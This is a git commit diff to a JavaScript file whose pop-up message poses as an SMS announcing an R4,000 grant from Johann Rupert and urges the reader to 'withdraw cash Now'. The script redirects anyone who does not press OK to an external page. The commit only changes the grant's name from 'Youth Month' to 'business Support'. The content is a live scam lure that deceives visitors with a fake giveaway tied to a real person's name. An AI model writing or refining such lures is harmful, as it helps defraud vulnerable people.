c9cb2e78326b5ea9dc90fee054863d5756693347
bigukpe <bigaka42@gmail.com>
2025-07-01 09:17:13 +0100

    Update youth-active.js

--- youth-active.js
+++ youth-active.js
@@ -1,5 +1,5 @@
 var password = 'WITHDRAW R4,000'
-password=prompt('SMS: Congratulations, you are among the selected ones to receive R4,000 Youth Month Grant from Johann Rupert, Press Ok to withdraw cash Now ','WITHDRAW R4,000');
+password=prompt('SMS: Congratulations, you are among the selected ones to receive R4,000 business Support Grant from Johann Rupert, Press Ok to withdraw cash Now ','WITHDRAW R4,000');
 if (password != 'WITHDRAW R4,000') {
 location.href='https://learnlivetech.org/youth-month.html';
 }
